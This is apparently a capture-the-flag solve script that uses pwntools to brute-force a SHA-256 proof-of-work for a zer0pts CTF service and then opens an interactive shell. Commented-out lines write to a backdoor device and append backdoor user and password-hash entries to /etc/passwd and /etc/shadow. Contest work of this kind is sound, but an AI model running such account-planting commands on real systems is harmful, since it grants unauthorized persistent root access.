"""
i.e.
sha256("????v0iRhxH4SlrgoUd5Blu0") = b788094e2d021fa16f30c83346f3c80de5afab0840750a49a9254c2a73ed274c

Suffix: v0iRhxH4SlrgoUd5Blu0
Hash: b788094e2d021fa16f30c83346f3c80de5afab0840750a49a9254c2a73ed274c
"""
import itertools
import hashlib
import string
from pwn import *
import time

table = string.ascii_letters + string.digits + "._"

r = remote ("any.ctf.zer0pts.com","11011")


line = r.recvline()
print(line)
suffix = line.split(b"????")[1].split(b'"')[0].decode("utf-8")
print(suffix)
hashval = line.strip().split(b"= ")[1].decode("utf-8")
print(hashval)

for v in itertools.product(table, repeat=4):
    if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
        r.sendline(''.join(v))

        break
else:
    print("[-] Solution not found :thinking_face:")

#r.sendline("echo \"b4ckd00r:/etc/passwd:999\" > /dev/backdoor")
#r.sendline("echo \"b4ckd00r:/etc/passwd:999\" > /dev/backdoor")

#r.sendline("echo \"mario:x:1234:1234:mario:/home\":/bin/bash\" > /etc/passwd")

#r.sendline("echo \"b4ckd00r:/etc/group:999\" > /dev/backdoor")

#echo "capo80:\$6\$R7wUIh/9$qXUCYQwIN8lETxFm5fx0/swwtQzNI7vZw3sSViz6Z/GGUuxhA" >> /etc/shadow
#echo "capo80:x:1000:1000:Caporaso Pasquale,,,:/home/capo80:/bin/bash" >> /etc/passwd

r.interactive()